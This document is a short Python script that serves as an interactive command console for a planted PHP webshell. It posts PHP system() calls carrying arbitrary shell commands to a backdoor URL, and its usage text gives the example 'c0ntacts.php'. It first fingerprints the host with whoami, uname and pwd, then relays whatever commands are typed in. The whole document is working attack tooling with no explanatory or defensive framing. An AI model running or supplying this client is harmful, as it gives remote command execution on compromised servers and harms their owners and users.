#!/usr/bin/python3
import requests
import sys
arguments=sys.argv
scriptname=arguments[0]
session=requests.Session()

def gethostname(url):
	if 'https://' in url:
		hostname=url.split('https://')[1].split('/')[0]
	elif 'http://' in url:
		hostname=url.split('http://')[1].split('/')[0]
	else:
		hostname=""
	return hostname
		
def checkconnection(user,uname,pwd):
	if len(user.strip()) < 2 or len(uname.strip()) == len(pwd.strip()):
		print(f"No valid user '{user.strip()}' found.Check connection")
		exit()	
	else:
		print(f"User : {user}")
		print(f"System : {uname}")
		print(f"Current Folder : {pwd}")
		print(f"Webshell : {url}\n")



if(len(arguments) == 2):
	url=arguments[1]
	command=""
	payload=f"system('whoami');"
	user=(session.post(url,data={"cmd":f"{payload}"}).text).strip()
	uname=(session.post(url,data={"cmd":f"system('uname -a');"}).text).strip()
	pwd=(session.post(url,data={"cmd":f"system('pwd');"}).text).strip()

	checkconnection(user,uname,pwd)
	user=f"{user}@{gethostname(url)}"
	exits='q exit'.split(' ')
	while command not in exits:
		command=input(f"{user} > ")
		if command == 'space':
			line="\n"
			print(f"{line * 256}")
		else:
			payload=f"system('{command} 2>/dev/null');"
			response=session.post(url,data={"cmd":f"{payload}"})
			content=response.text
			try:
				content=content.decode().strip()
			except:
				content=content.strip()

			print(f'{content}\n')
else:
	print(f'\tUsage : {scriptname} httpbackdoorlocation com')
	print(f'\t      : {scriptname} http://localhost/tests/c0ntacts.php')
	print(f'\t      : {scriptname} http://localhost/tests/c0ntacts.php ')
